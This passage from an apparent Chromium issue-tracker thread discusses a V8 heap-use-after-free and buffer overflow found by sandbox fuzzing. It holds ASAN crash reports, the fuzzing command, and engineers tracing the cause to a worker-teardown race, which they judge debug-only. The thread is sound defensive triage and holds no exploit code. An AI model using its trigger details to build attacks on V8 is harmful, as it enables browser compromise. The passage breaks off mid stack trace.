# Ignoring debug check failure in ../../v8/src/heap/heap.cc, line 4222: new_size <= old_size (204224 vs. -1089206312)
# Ignoring debug check failure in ../../v8/src/heap/heap.cc, line 3306: size > 2 * kTaggedSize (-1089410536 vs. 8)
# Ignoring debug check failure in ../../v8/src/objects/free-space-inl.h, line 30: size > 2 * kTaggedSize (-1089410536 vs. 8)
=================================================================
==418061==ERROR: AddressSanitizer: heap-use-after-free on address 0x7b8a1c3e7828 at pc 0x5c96ee8054e8 bp 0x7ffc17f6a040 sp 0x7ffc17f6a038
READ of size 8 at 0x7b8a1c3e7828 thread T0
    #0 0x5c96ee8054e7 in v8::internal::BaseSpace::heap() const v8/src/heap/base-space.h:28:5
    #1 0x5c96ee8054e7 in v8::internal::(anonymous namespace)::VerifyNoNeedToClearSlots(unsigned long, unsigned long) v8/src/heap/heap.cc:3330:10
    #2 0x5c96ee8054e7 in v8::internal::Heap::CreateFillerObjectAtRaw(v8::internal::WritableFreeSpace const&, v8::internal::ClearFreedMemoryMode, v8::internal::ClearRecordedSlots, v8::internal::Heap::VerifyNoSlotsRecorded) v8/src/heap/heap.cc:3379:5
    #3 0x5c96ee7cdfc4 in v8::internal::Heap::NotifyObjectSizeChange(v8::internal::Tagged<v8::internal::HeapObject>, int, int, v8::internal::ClearRecordedSlots) v8/src/heap/heap.cc:4238:3
    #4 0x5c96ee7cec3e in void v8::internal::Heap::RightTrimArray<v8::internal::FixedDoubleArray>(v8::internal::Tagged<v8::internal::FixedDoubleArray>, int, int) v8/src/heap/heap.cc:3618:5
    #5 0x5c96ef2bd7d8 in v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastPackedDoubleElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)4>>::SetLengthImpl(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSArray>, unsigned int, v8::internal::DirectHandle<v8::internal::FixedArrayBase>) v8/src/objects/elements.cc:869:7
    #6 0x5c96ef2bd7d8 in v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastPackedDoubleElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)4>>::SetLength(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSArray>, unsigned int) v8/src/objects/elements.cc:817:12
    #7 0x5c96ef9492c2 in v8::internal::JSArray::SetLength(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSArray>, unsigned int) v8/src/objects/objects.cc:4875:40
    #8 0x5c96edc58287 in v8::internal::Accessors::ArrayLengthSetter(v8::Local<v8::Name>, v8::Local<v8::Value>, v8::PropertyCallbackInfo<v8::Boolean> const&) v8/src/builtins/accessors.cc:209:7
    #9 0x5c96ef69bcbc in v8::internal::PropertyCallbackArguments::CallAccessorSetter(v8::internal::DirectHandle<v8::internal::AccessorInfo>, v8::internal::DirectHandle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::Object>) v8/src/api/api-arguments-inl.h:460:3
    #10 0x5c96ef92ef2c in v8::internal::Object::SetPropertyWithAccessor(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::Maybe<v8::internal::ShouldThrow>) v8/src/objects/objects.cc:1620:24
    #11 0x5c96ef93a3a7 in v8::internal::Object::SetPropertyInternal(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::Maybe<v8::internal::ShouldThrow>, v8::internal::StoreOrigin, bool*) v8/src/objects/objects.cc:2371:16
    #12 0x5c96ef9398dc in v8::internal::Object::SetProperty(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::StoreOrigin, v8::Maybe<v8::internal::ShouldThrow>) v8/src/objects/objects.cc:2466:9
    #13 0x5c96ef65060a in v8::internal::StoreIC::Store(v8::internal::Handle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver>>, v8::internal::Handle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::StoreOrigin) v8/src/ic/ic.cc:1975:5
    #14 0x5c96ef66b7b8 in v8::internal::__RT_impl_Runtime_StoreIC_Miss(v8::internal::Arguments<(v8::internal::ArgumentsType)0>, v8::internal::Isolate*) v8/src/ic/ic.cc:2968:3
    #15 0x5c96ef66a6a8 in v8::internal::Runtime_StoreIC_Miss(int, unsigned long*, v8::internal::Isolate*) v8/src/ic/ic.cc:2940:1
    #16 0x5c96f4e3babc in Builtins_CEntry_Return1_ArgvOnStack_NoBuiltinExit setup-isolate-deserialize.cc
    #17 0x5c96f500fb13 in Builtins_SetNamedPropertyHandler setup-isolate-deserialize.cc
    #18 0x5c96f4d01862 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #19 0x5c96f4cfcce6 in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #20 0x5c96f4cfca2a in Builtins_JSEntry setup-isolate-deserialize.cc
    #21 0x5c96ee39f0c2 in v8::internal::GeneratedCode<unsigned long, unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**>::Call(unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**) v8/src/execution/simulator.h:212:12
    #22 0x5c96ee39f0c2 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) v8/src/execution/execution.cc:442:22
    #23 0x5c96ee3a3229 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) v8/src/execution/execution.cc:542:10
    #24 0x5c96edb3e578 in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) v8/src/api/api.cc:1965:7
    #25 0x5c96ed1b8b61 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) v8/src/d8/d8.cc:1028:44
    #26 0x5c96ed1f2545 in v8::SourceGroup::Execute(v8::Isolate*) v8/src/d8/d8.cc:5077:10
    #27 0x5c96ed1ff631 in v8::Shell::RunMainIsolate(v8::Isolate*, bool) v8/src/d8/d8.cc:6029:37
    #28 0x5c96ed1fe63e in v8::Shell::RunMain(v8::Isolate*, bool) v8/src/d8/d8.cc:5937:18
    #29 0x5c96ed202ca8 in v8::Shell::Main(int, char**) v8/src/d8/d8.cc:6803:18
    #30 0x7e9a1cfb7249  (/lib/x86_64-linux-gnu/libc.so.6+0x27249) (BuildId: 79005c16293efa45b441fed45f4f29b138557e9e)

0x7b8a1c3e7828 is located 8 bytes inside of 200-byte region [0x7b8a1c3e7820,0x7b8a1c3e78e8)
freed by thread T46 (WorkerThread) here:
    #0 0x5c96ed13a396 in free /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_malloc_linux.cpp:51:3
    #1 0x5c96ee81f201 in std::__Cr::default_delete<v8::internal::Space>::operator()(v8::internal::Space*) const third_party/libc++/src/include/__memory/unique_ptr.h:77:5
    #2 0x5c96ee81f201 in std::__Cr::unique_ptr<v8::internal::Space, std::__Cr::default_delete<v8::internal::Space>>::reset(v8::internal::Space*) third_party/libc++/src/include/__memory/unique_ptr.h:290:7
    #3 0x5c96ee81f201 in v8::internal::Heap::TearDown() v8/src/heap/heap.cc:6368:15
    #4 0x5c96ee42b03a in v8::internal::Isolate::Deinit() v8/src/execution/isolate.cc:4628:9
    #5 0x5c96ee429a91 in v8::internal::Isolate::Deinitialize(v8::internal::Isolate*) v8/src/execution/isolate.cc:4205:12
    #6 0x5c96ee4298bc in v8::internal::Isolate::Delete(v8::internal::Isolate*) v8/src/execution/isolate.cc:4186:3
    #7 0x5c96ed1f6ba6 in v8::Worker::ExecuteInThread() v8/src/d8/d8.cc:5522:13
    #8 0x5c96ed1f577c in v8::Worker::WorkerThread::Run() v8/src/d8/d8.cc:5226:11
    #9 0x5c96edafa952 in v8::base::Thread::NotifyStartedAndRun() v8/src/base/platform/platform.h:627:5
    #10 0x5c96edafa952 in v8::base::ThreadEntry(void*) v8/src/base/platform/platform-posix.cc:1229:11
    #11 0x5c96ed137f86 in asan_thread_start(void*) /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors.cpp:239:28

previously allocated by thread T46 (WorkerThread) here:
    #0 0x5c96ed13a634 in malloc /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_malloc_linux.cpp:67:3
    #1 0x5c96f026f1ed in v8::base::Malloc(unsigned long) v8/src/base/platform/memory.h:44:10
    #2 0x5c96f026f1ed in v8::internal::AllocWithRetry(unsigned long, void* (*)(unsigned long)) v8/src/utils/allocation.cc:126:14
    #3 0x5c96f026f1ed in v8::internal::Malloced::operator new(unsigned long) v8/src/utils/allocation.cc:97:18
    #4 0x5c96ee8196c8 in std::__Cr::unique_ptr<v8::internal::OldSpace, std::__Cr::default_delete<v8::internal::OldSpace>> std::__Cr::make_unique<v8::internal::OldSpace, v8::internal::Heap*, 0>(v8::internal::Heap*&&) third_party/libc++/src/include/__memory/unique_ptr.h:759:26
    #5 0x5c96ee8196c8 in v8::internal::Heap::SetUpSpaces(v8::internal::LinearAllocationArea&, v8::internal::LinearAllocationArea&) v8/src/heap/heap.cc:5942:25
    #6 0x5c96ee43d643 in v8::internal::Isolate::Init(v8::internal::SnapshotData*, v8::internal::SnapshotData*, v8::internal::SnapshotData*, bool) v8/src/execution/isolate.cc:5691:9
    #7 0x5c96ee442a04 in v8::internal::Isolate::InitWithSnapshot(v8::internal::SnapshotData*, v8::internal::SnapshotData*, v8::internal::SnapshotData*, bool) v8/src/execution/isolate.cc:5325:10
    #8 0x5c96f01eb227 in v8::internal::Snapshot::Initialize(v8::internal::Isolate*) v8/src/snapshot/snapshot.cc:198:19
    #9 0x5c96edbbb200 in v8::Isolate::Initialize(v8::Isolate*, v8::Isolate::CreateParams const&) v8/src/api/api.cc:10027:8
    #10 0x5c96edbbc3dd in v8::Isolate::New(v8::IsolateGroup const&, v8::Isolate::CreateParams const&) v8/src/api/api.cc:10066:3
    #11 0x5c96edbbc3dd in v8::Isolate::New(v8::Isolate::CreateParams const&) v8/src/api/api.cc:10060:10
    #12 0x5c96ed1f5a0e in v8::Worker::ExecuteInThread() v8/src/d8/d8.cc:5395:14
    #13 0x5c96ed1f577c in v8::Worker::WorkerThread::Run() v8/src/d8/d8.cc:5226:11
    #14 0x5c96edafa952 in v8::base::Thread::NotifyStartedAndRun() v8/src/base/platform/platform.h:627:5
    #15 0x5c96edafa952 in v8::base::ThreadEntry(void*) v8/src/base/platform/platform-posix.cc:1229:11
    #16 0x5c96ed137f86 in asan_thread_start(void*) /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors.cpp:239:28

Thread T46 (WorkerThread) created by T0 here:
    #0 0x5c96ed11e871 in pthread_create /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors.cpp:250:3
    #1 0x5c96edafa681 in v8::base::Thread::Start() v8/src/base/platform/platform-posix.cc:1261:14
    #2 0x5c96ed1e1dd7 in v8::Worker::StartWorkerThread(v8::Isolate*, std::__Cr::shared_ptr<v8::Worker>, v8::base::Thread::Priority) v8/src/d8/d8.cc:5210:16
    #3 0x5c96ed1e135b in v8::Shell::WorkerNew(v8::FunctionCallbackInfo<v8::Value> const&) v8/src/d8/d8.cc:3345:10
    #4 0x5c96edc81aa1 in v8::internal::FunctionCallbackArguments::CallOrConstruct(v8::internal::Tagged<v8::internal::FunctionTemplateInfo>, bool) v8/src/api/api-arguments-inl.h:93:3
    #5 0x5c96edc7d43e in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<true>(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::HeapObject>, v8::internal::DirectHandle<v8::internal::FunctionTemplateInfo>, v8::internal::DirectHandle<v8::internal::Object>, unsigned long*, int) v8/src/builtins/builtins-api.cc:104:16
    #6 0x5c96edc7a195 in v8::internal::Builtin_Impl_HandleApiConstruct(v8::internal::BuiltinArguments, v8::internal::Isolate*) v8/src/builtins/builtins-api.cc:135:3
    #7 0x5c96edc79117 in v8::internal::Builtin_HandleApiConstruct(int, unsigned long*, v8::internal::Isolate*) v8/src/builtins/builtins-api.cc:126:1
    #8 0x5c96f4e3b9bc in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc
    #9 0x5c96f4d02381 in Builtins_InterpreterPushArgsThenFastConstructFunction setup-isolate-deserialize.cc
    #10 0x5c96f50296bc in Builtins_ConstructHandler setup-isolate-deserialize.cc
    #11 0x5c96f4d01862 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #12 0x5c96f4cfcce6 in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #13 0x5c96f4cfca2a in Builtins_JSEntry setup-isolate-deserialize.cc
    #14 0x5c96ee39f0c2 in v8::internal::GeneratedCode<unsigned long, unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**>::Call(unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**) v8/src/execution/simulator.h:212:12
    #15 0x5c96ee39f0c2 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) v8/src/execution/execution.cc:442:22
    #16 0x5c96ee3a3229 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) v8/src/execution/execution.cc:542:10
    #17 0x5c96edb3e578 in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) v8/src/api/api.cc:1965:7
    #18 0x5c96ed1b8b61 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) v8/src/d8/d8.cc:1028:44
    #19 0x5c96ed1f2545 in v8::SourceGroup::Execute(v8::Isolate*) v8/src/d8/d8.cc:5077:10
    #20 0x5c96ed1ff631 in v8::Shell::RunMainIsolate(v8::Isolate*, bool) v8/src/d8/d8.cc:6029:37
    #21 0x5c96ed1fe63e in v8::Shell::RunMain(v8::Isolate*, bool) v8/src/d8/d8.cc:5937:18
    #22 0x5c96ed202ca8 in v8::Shell::Main(int, char**) v8/src/d8/d8.cc:6803:18
    #23 0x7e9a1cfb7249  (/lib/x86_64-linux-gnu/libc.so.6+0x27249) (BuildId: 79005c16293efa45b441fed45f4f29b138557e9e)

SUMMARY: AddressSanitizer: heap-use-after-free v8/src/heap/base-space.h:28:5 in v8::internal::BaseSpace::heap() const
Shadow bytes around the buggy address:
  0x7b8a1c3e7580: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7b8a1c3e7600: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7b8a1c3e7680: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7b8a1c3e7700: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7b8a1c3e7780: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x7b8a1c3e7800: fa fa fa fa fd[fd]fd fd fd fd fd fd fd fd fd fd
  0x7b8a1c3e7880: fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa
  0x7b8a1c3e7900: fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7b8a1c3e7980: fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa
  0x7b8a1c3e7a00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7b8a1c3e7a80: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==418061==ABORTING

## V8 sandbox violation detected!

Received signal 6

==== C stack trace ===============================

/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8(___interceptor_backtrace+0x46)[0x5c96ed0e0856]
/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8(+0x2f445a9)[0x5c96edb025a9]
/lib/x86_64-linux-gnu/libc.so.6(+0x3c050)[0x7e9a1cfcc050]
/lib/x86_64-linux-gnu/libc.so.6(+0x8aeec)[0x7e9a1d01aeec]
/lib/x86_64-linux-gnu/libc.so.6(gsignal+0x12)[0x7e9a1cfcbfb2]
/lib/x86_64-linux-gnu/libc.so.6(abort+0xd3)[0x7e9a1cfb6472]
/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8(+0x5594202)[0x5c96f0152202]
/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8(+0x259b360)[0x5c96ed159360]
/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8(+0x2582b7b)[0x5c96ed140b7b]
/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8(+0x258495d)[0x5c96ed14295d]
/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8(__asan_report_load8+0x36)[0x5c96ed143756]
/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8(+0x3c474e8)[0x5c96ee8054e8]
/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8(+0x3c0ffc5)[0x5c96ee7cdfc5]
/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8(+0x3c10c3f)[0x5c96ee7cec3f]
/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8(+0x46ff7d9)[0x5c96ef2bd7d9]
/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8(+0x4d8b2c3)[0x5c96ef9492c3]
/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8(+0x309a288)[0x5c96edc58288]
/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8(+0x4addcbd)[0x5c96ef69bcbd]
/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8(+0x4d70f2d)[0x5c96ef92ef2d]
/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8(+0x4d7c3a8)[0x5c96ef93a3a8]
/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8(+0x4d7b8dd)[0x5c96ef9398dd]
/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8(+0x4a9260b)[0x5c96ef65060b]
/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8(+0x4aad7b9)[0x5c96ef66b7b9]
/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8(+0x4aac6a9)[0x5c96ef66a6a9]
/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8(+0xa27dabd)[0x5c96f4e3babd]
[end of stack trace]
Aborted (core dumped)

```

(This was generated with `ASAN_OPTIONS="halt_on_error=false:abort_on_error=false:redzone=16:max_redzone=32:thread_local_quarantine_size_kb=1:quarantine_size_mb=4096" ./d8 --jit-fuzzing --sandbox-testing`).

While looking at this, I am wondering if (at least the UAF) is related to [crbug.com/427662337](https://crbug.com/427662337) ?

### da...@hirsch.cx (2025-07-09)

Both ASAN faults seem to originate from `VerifyNoNeedToClearSlots`:

```
#ifdef DEBUG
void VerifyNoNeedToClearSlots(Address start, Address end) {
  MemoryChunk* chunk = MemoryChunk::FromAddress(start);
  if (chunk->InReadOnlySpace()) return;
  if (!v8_flags.sticky_mark_bits && chunk->InYoungGeneration()) return;
  MutablePageMetadata* mutable_page =
      MutablePageMetadata::cast(chunk->Metadata());
  BaseSpace* space = mutable_page->owner();
  space->heap()->VerifySlotRangeHasNoRecordedSlots(start, end);
}
#else
void VerifyNoNeedToClearSlots(Address start, Address end) {}
#endif  // DEBUG

```

Please note that the UAF happens in `space->heap()` while the buffer overflow happens in `VerifySlotRangeHasNoRecordedSlots`.

This also explains why the initial poc did not work in a release build.
I am still investigating whether this can be triggered in a release build.

### cl...@chromium.org (2025-07-10)

From the stack trace this looks a bit like isolate / heap confusion. The main thread seems to access the worker's isolate after it has been torn down.

### cl...@chromium.org (2025-07-10)

Oh, didn't read [comment #5](https://issues.chromium.org/issues/430498032#comment5) yet, which explains this nicely. We get the space and heap from the on-heap object, so this is related to <https://crbug.com/396607238>.

It seems to be debug-only code though, so no security impact.

### cl...@chromium.org (2025-07-10)

Can we fix this by simply putting a `SBXCHECK_EQ(space->heap(), Isolate::Current()->heap());` into that method?

### ml...@chromium.org (2025-07-10)

Still trying to parse the bug.

IIUC, we basically access a different Isolate's heap/space in here.

This is sometimes a valid operation with shared GC, so just putting a `SBX_CHECK()` into `MemoryChunk::Metadata()` (which is the bottleneck for accessing anything else) is not always correct.

Trying to understand where the address rage comes from in first place.

### ml...@chromium.org (2025-07-10)

It could indeed be a race during teardown where we null out the metadata entry.

On first sight, we can segregate the use cases into where we know it must be same Isolate and where we think it could be a different one.

### om...@chromium.org (2025-07-10)

Do we know if this reproduces on ToT? The initial report says V8 version 13.9, which is fairly recent, but we have crrev.com/c/6687412 that landed in version 14.0 and could already have an impact here.

### da...@hirsch.cx (2025-07-10)

Sorry, I was not able to test this yet as my build did not complete last night. I will try if this reproduces with <http://crrev.com/c/6687412> this evening (CEST).

### om...@chromium.org (2025-07-10)

I'm trying to reproduce on Linux with the pocs from c#1 and c#4. So far no success.
C#4 says that poc is flaky. Was the poc from c#1 also flaky or did it consistently reproduce?

### da...@hirsch.cx (2025-07-10)

The poc from C#1 reproduced consistently after I adjusted the initial delay with the for loop. One strange thing I noted is that even code comments at the beginning of the file influenced the timing, not sure why that is.

### ml...@chromium.org (2025-07-10)

There's a data race with teardown and the metadata table. I can see how the POC could be race.

Basically, `MemoryChunk::Metadata()` can read the pointer during teardown and right before we get rid of the metadata in destructors. That leads to UAF.

The POC is just a debug entry into this data race.

### ml...@chromium.org (2025-07-10)

fwiw, since we null out the metadata table pointer you should also crash when not winning the race.

### da...@hirsch.cx (2025-07-10)

I was able to reproduce the heap buffer overflow (poc from C#1) with V8 version 14.0.170 (with DCHECKs enabled):

```
ASAN_OPTIONS="halt_on_error=false:abort_on_error=false:redzone=16:max_redzone=32:thread_local_quarantine_size_kb=1:quarantine_size_mb=4096" ~/chrome/d/src/out/fuzzbuild-with-symbols/d8 --sandbox-testing ./program_20250709082216_F7D55EBB-18CA-45F7-82B8-E5BAC8070493_deterministic.js.min; done
[COV] no shared memory bitmap available, skipping
[COV] edge counters initialized. Shared memory: (null) with 1602114 edges
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
# Ignoring debug check failure in ../../v8/src/heap/heap.cc, line 3617: new_capacity < old_capacity (25528 vs. -673021828)
# Ignoring debug check failure in ../../v8/src/heap/heap.cc, line 4245: new_size <= old_size (204232 vs. -1089207320)
# Ignoring debug check failure in ../../v8/src/heap/heap.cc, line 3329: size > 2 * kTaggedSize (-1089411552 vs. 8)
# Ignoring debug check failure in ../../v8/src/objects/free-space-inl.h, line 30: size > 2 * kTaggedSize (-1089411552 vs. 8)
[COV] no shared memory bitmap available, skipping
[COV] edge counters initialized. Shared memory: (null) with 1602114 edges
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
# Ignoring debug check failure in ../../v8/src/heap/heap.cc, line 3617: new_capacity < old_capacity (25528 vs. -673021828)
# Ignoring debug check failure in ../../v8/src/heap/heap.cc, line 4245: new_size <= old_size (204232 vs. -1089207320)
# Ignoring debug check failure in ../../v8/src/heap/heap.cc, line 3329: size > 2 * kTaggedSize (-1089411552 vs. 8)
# Ignoring debug check failure in ../../v8/src/objects/free-space-inl.h, line 30: size > 2 * kTaggedSize (-1089411552 vs. 8)
# Ignoring debug check failure in ../../v8/src/heap/memory-chunk.cc, line 187: addr >= Metadata()->area_start() (139546694874968 vs. 139547784249360)
=================================================================
==75174==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x71ba22fe2a28 at pc 0x5ca33bf70762 bp 0x7fff50c21730 sp 0x7fff50c21728
READ of size 8 at 0x71ba22fe2a28 thread T0
    #0 0x5ca33bf70761 in long std::__Cr::__cxx_atomic_load<long>(std::__Cr::__cxx_atomic_base_impl<long> const volatile*, std::__Cr::memory_order) third_party/libc++/src/include/__atomic/support/c11.h:75:10
    #1 0x5ca33bf70761 in std::__Cr::__atomic_base<long, false>::load(std::__Cr::memory_order) const volatile third_party/libc++/src/include/__atomic/atomic.h:66:12
    #2 0x5ca33bf70761 in long std::__Cr::atomic_load_explicit<long>(std::__Cr::atomic<long> const volatile*, std::__Cr::memory_order) third_party/libc++/src/include/__atomic/atomic.h:533:15
    #3 0x5ca33bf70761 in v8::base::Acquire_Load(long const volatile*) v8/src/base/atomicops.h:352:10
    #4 0x5ca33bf70761 in heap::base::BasicSlotSet<4ul>::Bucket* v8::base::AsAtomicImpl<long>::Acquire_Load<heap::base::BasicSlotSet<4ul>::Bucket*>(heap::base::BasicSlotSet<4ul>::Bucket**) v8/src/base/atomic-utils.h:81:9
    #5 0x5ca33bf70761 in heap::base::BasicSlotSet<4ul>::Bucket* heap::base::BasicSlotSet<4ul>::LoadBucket<(heap::base::BasicSlotSet<4ul>::AccessMode)0>(heap::base::BasicSlotSet<4ul>::Bucket**) v8/src/heap/base/basic-slot-set.h:415:14
    #6 0x5ca33bf70761 in heap::base::BasicSlotSet<4ul>::Bucket* heap::base::BasicSlotSet<4ul>::LoadBucket<(heap::base::BasicSlotSet<4ul>::AccessMode)0>(unsigned long) v8/src/heap/base/basic-slot-set.h:421:12
    #7 0x5ca33bf70761 in unsigned long heap::base::BasicSlotSet<4ul>::Iterate<(heap::base::BasicSlotSet<4ul>::AccessMode)0, unsigned long v8::internal::SlotSet::Iterate<(v8::internal::AccessMode)0, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot)>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot), heap::base::BasicSlotSet<4ul>::EmptyBucketMode)::'lambda'(unsigned long), unsigned long v8::internal::SlotSet::Iterate<(v8::internal::AccessMode)0, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot)>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot), heap::base::BasicSlotSet<4ul>::EmptyBucketMode)::'lambda0'(unsigned long)>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot), unsigned long v8::internal::SlotSet::Iterate<(v8::internal::AccessMode)0, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot)>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot), heap::base::BasicSlotSet<4ul>::EmptyBucketMode)::'lambda0'(unsigned long)) v8/src/heap/base/basic-slot-set.h:347:24
    #8 0x5ca33bf7023b in unsigned long v8::internal::SlotSet::Iterate<(v8::internal::AccessMode)0, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot)>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot), heap::base::BasicSlotSet<4ul>::EmptyBucketMode) v8/src/heap/slot-set.h:154:26
    #9 0x5ca33bf7023b in v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long) v8/src/heap/remembered-set.h:80:17
    #10 0x5ca33bed62a5 in v8::internal::RememberedSet<(v8::internal::RememberedSetType)0>::CheckNoneInRange(v8::internal::MutablePageMetadata*, unsigned long, unsigned long) v8/src/heap/remembered-set.h:155:5
    #11 0x5ca33bed62a5 in v8::internal::Heap::VerifySlotRangeHasNoRecordedSlots(unsigned long, unsigned long) v8/src/heap/heap.cc:6697:3
    #12 0x5ca33bed62a5 in v8::internal::(anonymous namespace)::VerifyNoNeedToClearSlots(unsigned long, unsigned long) v8/src/heap/heap.cc:3353:18
